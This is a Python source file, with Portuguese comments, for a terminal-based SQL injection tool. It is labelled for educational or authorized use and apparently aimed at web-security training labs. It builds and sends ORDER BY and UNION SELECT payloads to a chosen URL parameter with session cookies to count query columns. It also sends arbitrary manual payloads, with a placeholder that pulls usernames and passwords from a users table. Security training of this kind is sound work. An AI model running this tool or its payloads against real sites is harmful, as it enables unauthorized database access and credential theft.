"""
SQLiTool - Ferramenta de testes de SQL Injection (uso educacional/autorizado)
Interface em terminal usando Textual.

Uso: python3 sqlitool.py
"""

from dataclasses import dataclass, field

import requests
from textual.app import App, ComposeResult
from textual import work
from textual.containers import Horizontal, Vertical, VerticalScroll
from textual.widgets import (
    Header,
    Footer,
    Static,
    Input,
    Button,
    TabbedContent,
    TabPane,
    Log,
    Label,
    Select,
)
from textual.reactive import reactive
from textual.binding import Binding
from textual.worker import Worker, WorkerState


# ---------------------------------------------------------------------------
# Estado do alvo (config compartilhada entre todas as abas)
# ---------------------------------------------------------------------------
@dataclass
class TargetState:
    base_url: str = ""
    path: str = ""
    param: str = ""
    method: str = "GET"
    cookie: str = ""

    def full_url(self) -> str:
        return f"{self.base_url.rstrip('/')}{self.path}"

    def cookie_dict(self) -> dict:
        """Converte 'nome=valor; nome2=valor2' em dict."""
        cookies = {}
        if not self.cookie.strip():
            return cookies
        for part in self.cookie.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v
        return cookies

    def is_valid(self) -> bool:
        return bool(self.base_url and self.path and self.param)


# ---------------------------------------------------------------------------
# Camada de rede: função pura, sem dependência da UI
# ---------------------------------------------------------------------------
def send_request(target: TargetState, payload: str, timeout: int = 10) -> requests.Response:
    """Envia o payload no parâmetro configurado e retorna a resposta bruta."""
    params = {target.param: payload}
    cookies = target.cookie_dict()

    if target.method.upper() == "GET":
        resp = requests.get(
            target.full_url(),
            params=params,
            cookies=cookies,
            timeout=timeout,
        )
    else:
        resp = requests.post(
            target.full_url(),
            data=params,
            cookies=cookies,
            timeout=timeout,
        )
    return resp


def build_order_by_payload(n: int) -> str:
    """Payload para testar ORDER BY n -- quebra quando n > número real de colunas."""
    return f"' ORDER BY {n}--"


def build_union_null_payload(n: int) -> str:
    """Payload UNION SELECT com n colunas, todas NULL."""
    nulls = ",".join(["NULL"] * n)
    return f"' UNION SELECT {nulls}--"


def analyze_response(resp: requests.Response) -> dict:
    """Heurística simples pra classificar a resposta como provável sucesso ou erro."""
    error_indicators = [
        "internal server error",
        "unable to cast",
        "ora-",
        "sql syntax",
        "unclosed quotation",
        "unterminated string",
        "database error",
    ]
    body_lower = resp.text.lower()
    has_error_text = any(ind in body_lower for ind in error_indicators)

    status = resp.status_code
    http_error = status == 404 or status in (401, 403)
    sql_error = status >= 500 or has_error_text

    return {
        "status_code": status,
        "length": len(resp.text),
        "looks_like_error": sql_error,
        "http_error": http_error,
        "matched_indicators": [ind for ind in error_indicators if ind in body_lower],
    }


# ---------------------------------------------------------------------------
# Painel de configuração do alvo (fica sempre visível, no topo)
# ---------------------------------------------------------------------------
class TargetConfig(Static):
    """Painel com os dados do alvo: URL, parâmetro, cookies/headers."""

    def compose(self) -> ComposeResult:
        with Vertical(id="target-config"):
            yield Label("🎯 Configuração do Alvo", classes="section-title")
            with Horizontal(classes="config-row"):
                yield Label("URL base:", classes="config-label")
                yield Input(
                    placeholder="https://exemplo.web-security-academy.net",
                    id="input-url",
                )
            with Horizontal(classes="config-row"):
                yield Label("Endpoint:", classes="config-label")
                yield Input(placeholder="/filter", id="input-path")
            with Horizontal(classes="config-row"):
                yield Label("Parâmetro:", classes="config-label")
                yield Input(placeholder="category", id="input-param")
            with Horizontal(classes="config-row"):
                yield Label("Método:", classes="config-label")
                yield Select(
                    [("GET", "GET"), ("POST", "POST")],
                    value="GET",
                    id="input-method",
                )
            with Horizontal(classes="config-row"):
                yield Label("Cookie:", classes="config-label")
                yield Input(placeholder="session=abc123...", id="input-cookie")
            with Horizontal(classes="config-buttons"):
                yield Button("Salvar config", id="btn-save-config", variant="primary")
                yield Button("Testar conexão", id="btn-test-conn", variant="default")


# ---------------------------------------------------------------------------
# Aba: Descobrir número de colunas
# ---------------------------------------------------------------------------
class ColumnCountTab(Static):
    def compose(self) -> ComposeResult:
        with Vertical(classes="tab-content"):
            yield Static(
                "Descobre quantas colunas a query original retorna, "
                "testando UNION SELECT NULL incrementalmente.",
                classes="tab-description",
            )
            with Horizontal(classes="config-row"):
                yield Label("Máx. colunas:", classes="config-label")
                yield Input(value="10", id="input-max-cols")
            with Horizontal(classes="config-row"):
                yield Label("Técnica:", classes="config-label")
                yield Select(
                    [
                        ("ORDER BY", "order_by"),
                        ("UNION SELECT NULL", "union_null"),
                    ],
                    value="union_null",
                    id="select-technique",
                )
            yield Button("▶ Executar teste", id="btn-run-columns", variant="success")


# ---------------------------------------------------------------------------
# Aba: Descobrir colunas de texto
# ---------------------------------------------------------------------------
class TextColumnTab(Static):
    def compose(self) -> ComposeResult:
        with Vertical(classes="tab-content"):
            yield Static(
                "Substitui cada posição por uma string marcadora para "
                "identificar quais colunas aceitam texto.",
                classes="tab-description",
            )
            with Horizontal(classes="config-row"):
                yield Label("Nº de colunas:", classes="config-label")
                yield Input(placeholder="ex: 2", id="input-num-cols")
            with Horizontal(classes="config-row"):
                yield Label("Marcador:", classes="config-label")
                yield Input(value="zXcVbN", id="input-marker")
            yield Button("▶ Executar teste", id="btn-run-textcols", variant="success")


# ---------------------------------------------------------------------------
# Aba: Fingerprint do banco de dados
# ---------------------------------------------------------------------------
class FingerprintTab(Static):
    def compose(self) -> ComposeResult:
        with Vertical(classes="tab-content"):
            yield Static(
                "Tenta identificar o SGBD (Oracle, MySQL, PostgreSQL, MSSQL) "
                "e extrair a versão via UNION-based.",
                classes="tab-description",
            )
            with Horizontal(classes="config-row"):
                yield Label("Nº de colunas:", classes="config-label")
                yield Input(placeholder="ex: 2", id="input-fp-cols")
            with Horizontal(classes="config-row"):
                yield Label("Coluna de texto (idx):", classes="config-label")
                yield Input(placeholder="ex: 0", id="input-fp-textcol")
            yield Button("▶ Detectar SGBD", id="btn-run-fingerprint", variant="success")


# ---------------------------------------------------------------------------
# Aba: Payload manual
# ---------------------------------------------------------------------------
class ManualPayloadTab(Static):
    def compose(self) -> ComposeResult:
        with Vertical(classes="tab-content"):
            yield Static(
                "Envie um payload customizado direto no parâmetro configurado.",
                classes="tab-description",
            )
            yield Label("Payload:", classes="config-label")
            yield Input(
                placeholder="' UNION SELECT username, password FROM users--",
                id="input-manual-payload",
            )
            yield Button("▶ Enviar", id="btn-run-manual", variant="success")


# ---------------------------------------------------------------------------
# App principal
# ---------------------------------------------------------------------------
class SQLiToolApp(App):
    CSS_PATH = "sqlitool.tcss"

    BINDINGS = [
        Binding("ctrl+q", "quit", "Sair"),
        Binding("ctrl+l", "clear_log", "Limpar log"),
    ]

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Horizontal(id="main-layout"):
            with VerticalScroll(id="left-pane"):
                yield TargetConfig()
                with TabbedContent(id="tabs"):
                    with TabPane("Nº Colunas", id="tab-columns"):
                        yield ColumnCountTab()
                    with TabPane("Colunas Texto", id="tab-textcols"):
                        yield TextColumnTab()
                    with TabPane("Fingerprint DB", id="tab-fingerprint"):
                        yield FingerprintTab()
                    with TabPane("Payload Manual", id="tab-manual"):
                        yield ManualPayloadTab()
            with Vertical(id="right-pane"):
                yield Label("📋 Log / Resultados", classes="section-title")
                yield Log(id="result-log", highlight=True)
        yield Footer()

    def on_mount(self) -> None:
        self.target = TargetState()
        log = self.query_one("#result-log", Log)
        log.write_line("SQLiTool iniciada. Configure o alvo à esquerda e escolha uma aba de teste.")

    def action_clear_log(self) -> None:
        self.query_one("#result-log", Log).clear()

    # -----------------------------------------------------------------
    # Helpers de log
    # -----------------------------------------------------------------
    def log_line(self, text: str) -> None:
        self.query_one("#result-log", Log).write_line(text)

    def read_target_from_inputs(self) -> TargetState:
        """Lê os campos de configuração da tela e monta um TargetState."""
        return TargetState(
            base_url=self.query_one("#input-url", Input).value.strip(),
            path=self.query_one("#input-path", Input).value.strip(),
            param=self.query_one("#input-param", Input).value.strip(),
            method=self.query_one("#input-method", Select).value,
            cookie=self.query_one("#input-cookie", Input).value.strip(),
        )

    # -----------------------------------------------------------------
    # Botões
    # -----------------------------------------------------------------
    def on_button_pressed(self, event: Button.Pressed) -> None:
        button_id = event.button.id

        if button_id == "btn-save-config":
            self.target = self.read_target_from_inputs()
            if self.target.is_valid():
                self.log_line(f"[config] ✅ Salvo: {self.target.full_url()} | param={self.target.param} | método={self.target.method}")
            else:
                self.log_line("[config] ⚠️  Preencha ao menos URL, endpoint e parâmetro.")

        elif button_id == "btn-test-conn":
            self.target = self.read_target_from_inputs()
            if not self.target.is_valid():
                self.log_line("[config] ⚠️  Configure o alvo antes de testar.")
                return
            self.run_test_connection()

        elif button_id == "btn-run-columns":
            if not self.target.is_valid():
                self.log_line("[colunas] ⚠️  Configure e salve o alvo primeiro.")
                return
            max_cols_raw = self.query_one("#input-max-cols", Input).value.strip()
            technique = self.query_one("#select-technique", Select).value
            try:
                max_cols = int(max_cols_raw)
            except ValueError:
                self.log_line("[colunas] ⚠️  'Máx. colunas' precisa ser um número.")
                return
            self.run_column_count(max_cols, technique)

        elif button_id == "btn-run-textcols":
            self.log_line("[texto] Executando teste de colunas de texto... (a implementar).")

        elif button_id == "btn-run-fingerprint":
            self.log_line("[fingerprint] Detectando SGBD... (a implementar).")

        elif button_id == "btn-run-manual":
            if not self.target.is_valid():
                self.log_line("[manual] ⚠️  Configure e salve o alvo primeiro (aba de config no topo).")
                return
            payload = self.query_one("#input-manual-payload", Input).value
            if not payload.strip():
                self.log_line("[manual] ⚠️  Digite um payload antes de enviar.")
                return
            self.run_manual_payload(payload)

    # -----------------------------------------------------------------
    # Workers (rodam em thread separada, não travam a UI)
    # -----------------------------------------------------------------
    @work(thread=True, exclusive=True)
    def run_test_connection(self) -> None:
        self.call_from_thread(self.log_line, "[config] Testando conexão...")
        try:
            resp = send_request(self.target, payload="")
            status = resp.status_code

            if 200 <= status < 400:
                icon = "✅"
                note = ""
            elif status == 404:
                icon = "⚠️ "
                note = " -- endpoint não encontrado: confira Método (GET/POST) e Endpoint"
            elif status in (401, 403):
                icon = "⚠️ "
                note = " -- acesso negado: confira o Cookie de sessão"
            else:
                icon = "⚠️ "
                note = f" -- servidor respondeu com erro ({status})"

            self.call_from_thread(
                self.log_line,
                f"[config] {icon} Requisição concluída: status={status} | "
                f"tamanho={len(resp.text)} bytes{note}",
            )
        except requests.exceptions.RequestException as e:
            self.call_from_thread(self.log_line, f"[config] ❌ Erro de conexão: {e}")

    @work(thread=True, exclusive=True)
    def run_column_count(self, max_cols: int, technique: str) -> None:
        technique_label = "ORDER BY" if technique == "order_by" else "UNION SELECT NULL"
        self.call_from_thread(
            self.log_line, f"[colunas] Iniciando teste ({technique_label}), até {max_cols} colunas..."
        )

        found = None

        for n in range(1, max_cols + 1):
            payload = (
                build_order_by_payload(n)
                if technique == "order_by"
                else build_union_null_payload(n)
            )
            try:
                resp = send_request(self.target, payload)
            except requests.exceptions.RequestException as e:
                self.call_from_thread(self.log_line, f"[colunas] ❌ Erro de requisição: {e}")
                return

            analysis = analyze_response(resp)
            failed = analysis["looks_like_error"] or analysis["http_error"]

            status_icon = "❌" if failed else "✅"
            self.call_from_thread(
                self.log_line,
                f"[colunas] {status_icon} n={n} | payload={payload!r} | status={analysis['status_code']}",
            )

            if technique == "order_by":
                # ORDER BY: assim que falhar, o número certo é o anterior (n-1)
                if failed:
                    found = n - 1
                    break
            else:
                # UNION SELECT NULL: assim que NÃO falhar, achamos o número certo
                if not failed:
                    found = n
                    break

        if found and found > 0:
            self.call_from_thread(
                self.log_line,
                f"[colunas] 🎯 Número de colunas encontrado: {found}",
            )
        else:
            self.call_from_thread(
                self.log_line,
                "[colunas] ⚠️  Não foi possível determinar o número de colunas "
                f"dentro do limite de {max_cols}. Tente aumentar 'Máx. colunas'.",
            )

    @work(thread=True, exclusive=True)
    def run_manual_payload(self, payload: str) -> None:
        self.call_from_thread(self.log_line, f"[manual] Enviando payload: {payload!r}")
        try:
            resp = send_request(self.target, payload)
            analysis = analyze_response(resp)

            if analysis["http_error"]:
                status_icon = "⚠️ "
                extra = " -- confira Método/Endpoint/Cookie"
            elif analysis["looks_like_error"]:
                status_icon = "❌"
                extra = " -- provável erro de sintaxe SQL"
            else:
                status_icon = "✅"
                extra = ""

            self.call_from_thread(
                self.log_line,
                f"[manual] {status_icon} status={analysis['status_code']} | "
                f"tamanho={analysis['length']} bytes{extra}",
            )

            if analysis["matched_indicators"]:
                self.call_from_thread(
                    self.log_line,
                    f"[manual]    indícios de erro SQL: {', '.join(analysis['matched_indicators'])}",
                )

            # Preview do corpo da resposta (primeiras linhas úteis)
            preview = resp.text.strip().replace("\n", " ")[:300]
            self.call_from_thread(self.log_line, f"[manual]    preview: {preview}...")

        except requests.exceptions.RequestException as e:
            self.call_from_thread(self.log_line, f"[manual] ❌ Erro de requisição: {e}")


if __name__ == "__main__":
    SQLiToolApp().run()